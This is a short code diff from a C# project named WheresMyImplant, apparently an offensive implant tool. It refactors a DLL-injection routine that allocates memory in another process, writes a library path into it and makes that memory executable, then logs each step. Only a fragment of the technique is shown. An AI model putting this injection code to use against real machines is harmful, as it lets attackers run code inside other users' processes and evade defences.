@@ -18,7 +18,7 @@ namespace WheresMyImplant
             IntPtr lpAddress = IntPtr.Zero;
             UInt32 dwSize = (UInt32)((library.Length + 1) * Marshal.SizeOf(typeof(char)));
             WriteOutputNeutral("Attempting to allocate memory");
-            IntPtr lpBaseAddress = Unmanaged.VirtualAllocEx(hProcess, lpAddress, dwSize, Unmanaged.MEM_COMMIT | Unmanaged.MEM_RESERVE, Winnt.PAGE_READWRITE);
+            IntPtr lpBaseAddress = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, Unmanaged.MEM_COMMIT | Unmanaged.MEM_RESERVE, Winnt.PAGE_READWRITE);
             WriteOutputGood("Allocated " + dwSize + " bytes at " + lpBaseAddress.ToString("X4"));
             WriteOutputGood("Memory Protection Set to PAGE_READWRITE");
 
@@ -26,13 +26,13 @@ namespace WheresMyImplant
             UInt32 lpNumberOfBytesWritten = 0;
             IntPtr libraryPtr = Marshal.StringToHGlobalAnsi(library);
             WriteOutputNeutral("Attempting to write process memory");
-            Boolean writeProcessMemoryResult = Unmanaged.WriteProcessMemory(hProcess, lpBaseAddress, libraryPtr, dwSize, ref lpNumberOfBytesWritten);
+            Boolean writeProcessMemoryResult = kernel32.WriteProcessMemory(hProcess, lpBaseAddress, libraryPtr, dwSize, ref lpNumberOfBytesWritten);
             WriteOutputGood("Wrote " + dwSize + " bytes");
 
             ////////////////////////////////////////////////////////////////////////////////
             UInt32 lpflOldProtect = 0;
             WriteOutputNeutral("Attempting to Alter Memory Protections to PAGE_EXECUTE_READ");
-            Boolean virtualProtectExResult = Unmanaged.VirtualProtectEx(hProcess, lpBaseAddress, dwSize, Winnt.PAGE_EXECUTE_READ, ref lpflOldProtect);
+            Boolean virtualProtectExResult = kernel32.VirtualProtectEx(hProcess, lpBaseAddress, dwSize, Winnt.PAGE_EXECUTE_READ, ref lpflOldProtect);
             WriteOutputGood("Set Memory Protection to PAGE_EXECUTE_READ");
 
             ////////////////////////////////////////////////////////////////////////////////
